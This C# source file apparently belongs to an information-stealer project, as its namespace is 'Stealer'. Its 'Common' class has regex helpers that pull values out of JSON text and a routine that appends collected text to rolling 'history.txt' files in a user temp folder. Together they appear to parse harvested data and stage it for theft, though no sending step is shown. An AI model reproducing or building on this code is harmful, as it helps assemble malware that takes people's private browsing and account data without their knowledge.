using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Net;
using System.IO;
namespace Stealer
{
    class Common
    {
        static int fileCounter = 1;
        public static string fileName = String.Empty;

        public static string Extract(string target, string content)
        {
            string output = String.Empty;
            Regex rx = new Regex("\"" + target + "\"\\s*:\\s*(\"(?:\\\\\"|[^\"])*?\")");
            MatchCollection matches = rx.Matches(content);
            foreach (Match match in matches)
            {
                GroupCollection groups = match.Groups;
                output = groups[1].Value;
            }
            output = output.Replace("\"", "");
            return output;
        }

        public static List<string> RegexJson(string content, string regex)
        {
            List<string> output = new List<string>();
            var pattern = new Regex(regex, RegexOptions.Compiled).Matches(content);
            foreach (Match prof in pattern)
            {
                if (prof.Success)
                {
                    output.Add(prof.Groups[1].Value);
                }
            }
            return output;
        }

        public static void WriteToFile(string writeText)
        {

            fileName = User.tempFolder + "\\history" + ".txt";
            if (File.Exists(fileName))
            {
                string str = File.ReadAllText(fileName);

                if ((str.Length + writeText.Length) / 1024 > 8000)  
                {
                    fileCounter++;
                    fileName = User.tempFolder + "\\history_" + fileCounter + ".txt";
                    StreamWriter _sw = new StreamWriter(fileName, true);
                    _sw.WriteLine(writeText);
                    _sw.Close();

                }
                else  // use exixting file
                {
                    StreamWriter _sw = new StreamWriter(fileName, true);
                    _sw.WriteLine(writeText);
                    _sw.Close();
                }
            }

        }
    }



}
